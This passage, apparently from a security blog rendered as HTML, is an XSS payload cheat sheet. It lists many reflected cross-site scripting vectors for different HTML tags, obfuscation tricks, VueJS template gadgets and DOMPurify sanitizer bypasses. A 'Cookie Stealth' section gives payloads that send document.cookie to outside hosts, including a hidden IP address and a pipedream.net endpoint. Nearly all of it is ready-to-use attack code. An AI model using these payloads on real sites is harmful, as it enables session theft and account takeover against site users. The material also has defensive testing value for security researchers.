<span class="attr">onload</span>=<span class="string">&quot;window.location=&#x27;URL&#x27;&quot;</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.rog/200/svg&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">rect</span> <span class="attr">width</span>=<span class="string">&quot;300&quot;</span> <span class="attr">height</span>=<span class="string">&quot;100&quot;</span> <span class="attr">style</span>=<span class="string">&quot;fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">code</span>&gt;</span></span><br></pre></td></tr></table></figure><hr><h2 id="XSS-Payload"><a href="#XSS-Payload" class="headerlink" title="XSS Payload"></a>XSS Payload<br></h2><p><span style="color:#21C587">&#35;</span><strong> Reflection XSS statement</strong><br></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line">script tag</span><br><span class="line"><span class="tag">&lt;<span class="name">scrit</span>&gt;</span>void&#x27;&#x27;??globalThis?.alert?.(...[0b1_0_1_0_0_1_1_1_0_0_1,],)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="handlebars"><span class="xml">alert(1)<span class="tag">&lt;/<span class="name">scipt</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">this</span>[<span class="string">&quot;alert&quot;</span>](<span class="built_in">this</span>[<span class="string">&quot;document&quot;</span>][<span class="string">&quot;cookie&quot;</span>]);</span></span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">onerror=alert;<span class="keyword">throw</span> <span class="number">1</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">&#123;onerror=alert&#125;<span class="keyword">throw</span> <span class="number">1</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;data:;base64,YWxlcnQoMSk=&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">&lt;script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.2/angular.js&gt;<span class="tag">&lt;/<span class="name">script</span>&gt;</span>&lt;div/ng-app&gt;&lt;input/autofocus/ng-focus=$event.path|orderBy:&#x27;[].constructor.from([1],alert)&#x27;&gt;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">img tag</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">window.alert(1)</span> &gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">window[</span>&#x27;<span class="attr">eva</span>&#x27;+&#x27;<span class="attr">l</span>&#x27;](<span class="attr">alert</span>(<span class="attr">1</span>)) &gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">_</span>=<span class="string">alert,_(/xss/)</span> &gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">_</span>=<span class="string">&#x27;e&#x27;</span>+&#x27;<span class="attr">val</span>&#x27;,<span class="attr">_</span>(<span class="attr">alert</span>(<span class="attr">1</span>)) &gt;</span></span><br><span class="line"></span><br><span class="line">svg tag</span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">&amp;#97&amp;#108&amp;#101&amp;#114&amp;#116&amp;#40&amp;#49&amp;#41</span>&gt;</span></span><br><span class="line">&lt;svg/onload=setTimeout(&#x27;\141\154\145\162\164\50\61\51&#x27;)&gt;</span><br><span class="line">&lt;svg/onload=&#x27;+/&quot;/+/onmouseover=1/+/[*/[]/+alert(1)//&#x27;&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onx</span>=<span class="string">()</span> <span class="attr">onload</span>=<span class="string">window.alert?.()</span>&gt;</span></span><br><span class="line">  </span><br><span class="line">details tag</span><br><span class="line"><span class="tag">&lt;<span class="name">details</span> <span class="attr">open</span> <span class="attr">ontoggle</span>=<span class="string">top.alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">details</span> <span class="attr">open</span> <span class="attr">ontoggle</span>=<span class="string">top[</span>&#x27;<span class="attr">prompt</span>&#x27;](<span class="attr">1</span>)&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">details</span> <span class="attr">open</span> <span class="attr">ontoggle</span>=<span class="string">eval(</span>&#x27;<span class="attr">alert</span>(<span class="attr">1</span>)&#x27;) &gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">details</span> <span class="attr">open</span> <span class="attr">ontoggle</span>=<span class="string">eval(atob(</span>&#x27;<span class="attr">YWxlcnQoMSk</span>=<span class="string">&#x27;)) &gt;</span></span></span><br><span class="line"><span class="tag"><span class="string">&lt;details open ontoggle=eval(&#x27;</span>\<span class="attr">141</span>\<span class="attr">154</span>\<span class="attr">145</span>\<span class="attr">162</span>\<span class="attr">164</span>\<span class="attr">50</span>\<span class="attr">61</span>\<span class="attr">51</span>&#x27;) &gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">details</span> <span class="attr">open</span> <span class="attr">ontoggle</span>=<span class="string">eval(String.fromCharCode(97,108,101,114,116,40,49,41))</span> &gt;</span></span><br><span class="line">  </span><br><span class="line">iframe tag</span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">onload</span>=<span class="string">&amp;#97&amp;#108&amp;#101&amp;#114&amp;#116&amp;#40&amp;#49&amp;#41</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">srcdoc</span>=<span class="string">&quot;&lt;img src=x:x onerror=alert(1)&gt;&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">onload</span>=<span class="string">location</span>=<span class="string">&#x27;javascri&#x27;</span><span class="attr">.concat</span>(&#x27;<span class="attr">pt:aler</span>&#x27;,&#x27;<span class="attr">t</span>(<span class="attr">1</span>)&#x27;)&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">onload</span>=<span class="string">location</span>=<span class="string">[</span>&#x27;<span class="attr">java</span>&#x27;,&#x27;<span class="attr">script:</span>&#x27;,&#x27;<span class="attr">alert</span>(<span class="attr">1</span>)&#x27;]<span class="attr">.join</span>(&quot;&quot;)&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMSk+&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"></span><br><span class="line">body tag</span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onpageshow</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line">&lt;body/onfocus=alert(1)&gt;</span><br><span class="line">&lt;body/onload=alert(1)&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">href</span>=<span class="string">x</span> %<span class="attr">00</span> <span class="attr">nonafterprint</span>=<span class="string">confirm(document.domain)</span> <span class="attr">autofocus</span>&gt;</span></span><br><span class="line">&lt;body/onload=document.write(String.fromCharCode(60,115,99,114,105,112,116,62,97,108,101,114,116,40,49,41,60,47,115,99,114,105,112,116,62)) &gt;</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">input tag</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">autofocus</span> <span class="attr">onfocus</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">image</span> <span class="attr">src</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">onblur</span>=<span class="string">alert(1)</span> <span class="attr">id</span>=<span class="string">x</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">autofocus</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">onbeforecopy</span>=<span class="string">alert(1)</span> <span class="attr">value</span>=<span class="string">&quot;XSS&quot;</span> <span class="attr">autofocus</span>&gt;</span></span><br><span class="line">&lt;input/autofocus/onfocus=&amp;#97&amp;#108&amp;#101&amp;#114&amp;#116&amp;#40&amp;#49&amp;#41&gt;</span><br><span class="line">  </span><br><span class="line">a tag</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">onmouseover</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span>link<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">#</span> <span class="attr">name</span>=<span class="string">xss</span> <span class="attr">autofocus</span> <span class="attr">onfocus</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">draggable</span>=<span class="string">&quot;true&quot;</span> <span class="attr">ondragend</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:&#x27;\74\163\166\147\40\157\156\154\157\141\144\75\141\154\145\162\164\50\61\51\76&#x27;&quot;</span>&gt;</span>link<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">  </span><br><span class="line">video tag</span><br><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">onkeypress</span>=<span class="string">&quot;alert(1)&quot;</span> <span class="attr">contenteditable</span>&gt;</span><span class="tag">&lt;/<span class="name">video</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">alert(/xss/)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">src</span> <span class="attr">onloadstart</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">video</span>&gt;</span><span class="tag">&lt;<span class="name">source</span> <span class="attr">onerror</span>=<span class="string">location</span>=<span class="string">/http:\\domain.tld\page/.source+document.cookie</span> &gt;</span></span><br><span class="line"></span><br><span class="line">button tag</span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onfocus</span>=<span class="string">alert(1)</span> <span class="attr">autofocus</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">ondblclick</span>=<span class="string">&quot;alert(1)&quot;</span> <span class="attr">autofocus</span> <span class="attr">tabindex</span>=<span class="string">1</span>&gt;</span>test<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onkeyup</span>=<span class="string">&quot;alert(1)&quot;</span> <span class="attr">contenteditable</span>&gt;</span>test<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">  </span><br><span class="line">object tag</span><br><span class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">data</span>=<span class="string">&#x27;data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMSk+&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">type</span>=<span class="string">&#x27;text/x-scriptlet&#x27;</span> <span class="attr">data</span>=<span class="string">&#x27;http://example.com/xss.html&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br><span class="line">  xss.html -&gt; <span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">embed tag</span><br><span class="line"><span class="tag">&lt;<span class="name">embed</span> <span class="attr">src</span>=<span class="string">&quot;data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMSk+&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">embed</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">embed</span> <span class="attr">src</span>=<span class="string">&quot;javascript:alert(1)&quot;</span>&gt;</span></span><br><span class="line">  </span><br><span class="line">audio tag</span><br><span class="line"><span class="tag">&lt;<span class="name">audio</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(/xss/)</span>&gt;</span></span><br><span class="line">  </span><br><span class="line">textarea tag</span><br><span class="line"><span class="tag">&lt;<span class="name">textarea</span> <span class="attr">autofocus</span> <span class="attr">onfocus</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line">  </span><br><span class="line">meter tag</span><br><span class="line"><span class="tag">&lt;<span class="name">meter</span> <span class="attr">onmouseover</span>=<span class="string">alert(1)</span>&gt;</span><span class="tag">&lt;/<span class="name">meter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meter</span> <span class="attr">onmousemove</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">meter</span>&gt;</span></span><br><span class="line"></span><br><span class="line">select tag</span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">autofocus</span> <span class="attr">onfocus</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"></span><br><span class="line">form tag</span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">onsubmit</span>=<span class="string">alert(1)</span>&gt;</span><span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">submit</span>&gt;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">  </span><br><span class="line">Constructor</span><br><span class="line">&#123;&#123;+constructor.constructor(&quot;alert(document.cookie)&quot;)()+&#125;&#125;</span><br><span class="line">  </span><br><span class="line">Etc</span><br><span class="line">ax6zt%2522%253e%253cscript%253ealert%2528document.domain%2529%253c%252fscript%253ey6uu6</span><br><span class="line">jaVasCript:/*-/*`/*`/*â€™/*â€/**/(/* */onMouSeoVer=alert(1) )</span><br></pre></td></tr></table></figure><p><span style="color:#21C587">&#35;</span><strong> Cookie Stealth</strong><br></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">fetch(<span class="string">&#x27;url&#x27;</span>%2bdocument.cookie)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">(<span class="keyword">new</span> Image).src=<span class="string">&#x27;url&#x27;</span>%2bdocument.cookie;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;//code.jquery.com/jquery.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">$.get(<span class="string">&#x27;url&#x27;</span>%2bdocument.cookie)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;//code.jquery.com/jquery.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">$.getScript(<span class="string">&quot;//domain&quot;</span>%2bdocument.cookie)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">&quot;javascript:document.location=&#x27;url&#x27;%2bdocument.cookie&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">onload</span>=<span class="string">location</span>=<span class="string">&#x27;javascri&#x27;</span><span class="attr">.concat</span>(&quot;<span class="attr">pt:document</span>&quot;,&quot;<span class="attr">.location</span>=<span class="string">&quot;,&quot;</span>&#x27;<span class="attr">url</span>&#x27;%<span class="attr">2bdocument.cookie</span>&quot;)&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">onload</span>=<span class="string">location</span>=<span class="string">[</span>&quot;<span class="attr">java</span>&quot;,&quot;<span class="attr">script:</span>&quot;,&quot;<span class="attr">document.location</span>=<span class="string">&quot;,&quot;</span>&#x27;<span class="attr">url</span>&#x27;%<span class="attr">2bdocument.cookie</span>&quot;]<span class="attr">.join</span>(&quot;&quot;)&gt;</span></span><br><span class="line">&lt;svg/onload=setTimeout(&quot;\u006a\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003a\u0064\u006f\u0063\u0075\u006d\u0065\u006e\u0074\u002e\u006c\u006f\u0063\u0061\u0074\u0069\u006f\u006e\u003d\u0027\u0068\u0074\u0074\u0070\u003a\u002f\u002f\u0031\u0034\u0031\u002e\u0031\u0036\u0034\u002e\u0035\u0032\u002e\u0032\u0030\u0037\u003a\u0031\u0032\u0033\u0034\u0035\u002f\u003f\u0061\u003d\u0027\u002b\u0064\u006f\u0063\u0075\u006d\u0065\u006e\u0074\u002e\u0063\u006f\u006f\u006b\u0069\u0065&quot;)&gt;</span><br><span class="line">&lt;script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.2/angular.js&gt;<span class="tag">&lt;/<span class="name">script</span>&gt;</span>&lt;div/ng-app&gt;&lt;input/autofocus/ng-focus=$event.path|orderBy:&#x27;[].constructor.from([location.replace(&quot;//384bbb03a643480f7077ff3d9d4b01d5.m.pipedream.net?&quot;+document.cookie)],console.log)&#x27;&gt;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><hr><h2 id="VueJS-script-gadgets"><a href="#VueJS-script-gadgets" class="headerlink" title="VueJS script gadgets"></a>VueJS script gadgets</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">VueJS version 2</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">v-show</span>=<span class="string">&quot;_c.constructor`alert(1)`()&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">x</span> <span class="attr">v-on:click</span>=<span class="string">&#x27;_b.constructor`alert(1)`()&#x27;</span>&gt;</span>click<span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">x</span> <span class="attr">v-bind:a</span>=<span class="string">&#x27;_b.constructor`alert(1)`()&#x27;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">x</span> @[<span class="attr">_b.constructor</span>`<span class="attr">alert</span>(<span class="attr">1</span>)`()]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">x</span> <span class="attr">:</span>[<span class="attr">_b.constructor</span>`<span class="attr">alert</span>(<span class="attr">1</span>)`()]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">v-</span>=<span class="string">_c.constructor</span>`<span class="attr">alert</span>(<span class="attr">1</span>)`()&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">x</span> #[<span class="attr">_c.constructor</span>`<span class="attr">alert</span>(<span class="attr">1</span>)`()]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">:</span>=<span class="string">_c.constructor</span>`<span class="attr">alert</span>(<span class="attr">1</span>)`()&gt;</span></span><br><span class="line">&#123;&#123;_c.constructor(&#x27;alert(1)&#x27;)()&#125;&#125;</span><br><span class="line">&#123;&#123;_b.constructor`alert(1)`()&#125;&#125;</span><br><span class="line">&#123;&#123;_c.constructor`alert(document.currentScript.nonce)`()&#125;&#125; </span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">VueJS version 3</span><br><span class="line"></span><br><span class="line">&#123;&#123;_openBlock.constructor(&#x27;alert(1)&#x27;)()&#125;&#125;</span><br><span class="line">&#123;&#123;_createBlock.constructor(&#x27;alert(1)&#x27;)()&#125;&#125;</span><br><span class="line">&#123;&#123;_toDisplayString.constructor(&#x27;alert(1)&#x27;)()&#125;&#125;</span><br><span class="line">&#123;&#123;_createVNode.constructor(&#x27;alert(1)&#x27;)()&#125;&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">v-show</span>=<span class="string">&quot;_createBlock.constructor`alert(1)`()&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">x</span> @[<span class="attr">_openBlock.constructor</span>`<span class="attr">alert</span>(<span class="attr">1</span>)`()]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">x</span> @[<span class="attr">_capitalize.constructor</span>`<span class="attr">alert</span>(<span class="attr">1</span>)`()]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">x</span> @<span class="attr">click</span>=<span class="string">_withCtx.constructor</span>`<span class="attr">alert</span>(<span class="attr">1</span>)`()&gt;</span>click<span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">x</span> @<span class="attr">click</span>=<span class="string">$event.view.alert(1)</span>&gt;</span>click<span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br><span class="line">&#123;&#123;_Vue.h.constructor`alert(document.currentScript.nonce)`()&#125;&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="DOMPurify-Bypass"><a href="#DOMPurify-Bypass" class="headerlink" title="DOMPurify Bypass"></a>DOMPurify Bypass<br></h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span><span class="tag">&lt;<span class="name">math</span>&gt;</span><span class="tag">&lt;<span class="name">mtext</span>&gt;</span><span class="tag">&lt;<span class="name">form</span>&gt;</span><span class="tag">&lt;<span class="name">mglyph</span>&gt;</span><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="xml"><span class="tag">&lt;/<span class="name">math</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span><span class="tag">&lt;/<span class="name">mglyph</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span><span class="tag">&lt;/<span class="name">mtext</span>&gt;</span><span class="tag">&lt;/<span class="name">math</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span><span class="tag">&lt;<span class="name">math</span>&gt;</span><span class="tag">&lt;<span class="name">mtext</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span><span class="tag">&lt;<span class="name">form</span>&gt;</span><span class="tag">&lt;<span class="name">mglyph</span>&gt;</span><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">mtext</span>&gt;</span><span class="tag">&lt;<span class="name">style</span>&gt;</span>&lt;path id=&quot;<span class="tag">&lt;/<span class="name">style</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span> <span class="attr">src</span>&gt;</span>&quot;&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">style</span>&gt;</span>&lt;a id=&quot;<span class="tag">&lt;/<span class="name">style</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span>&quot;&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">math</span>&gt;</span><span class="tag">&lt;<span class="name">mtext</span>&gt;</span><span class="tag">&lt;<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">mglyph</span>&gt;</span><span class="tag">&lt;<span class="name">style</span>&gt;</span>&lt;!--<span class="tag">&lt;/<span class="name">style</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">title</span>=<span class="string">&quot;--<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>img src=1 onerror=alert(1)<span class="symbol">&amp;gt;</span>&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">math</span>&gt;</span><span class="tag">&lt;<span class="name">mtext</span>&gt;</span><span class="tag">&lt;<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">mglyph</span>&gt;</span><span class="tag">&lt;<span class="name">style</span>&gt;</span>&lt;![CDATA[<span class="tag">&lt;/<span class="name">style</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">title</span>=<span class="string">&quot;]]<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>/mglyph<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>img<span class="symbol">&amp;Tab;</span>src=1<span class="symbol">&amp;Tab;</span>onerror=alert(1)<span class="symbol">&amp;gt;</span>&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">math</span>&gt;</span><span class="tag">&lt;<span class="name">mtext</span>&gt;</span><span class="tag">&lt;<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">mglyph</span>&gt;</span><span class="tag">&lt;<span class="name">style</span>&gt;</span>&lt;!--<span class="tag">&lt;/<span class="name">style</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">title</span>=<span class="string">&quot;--<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>/mglyph<span 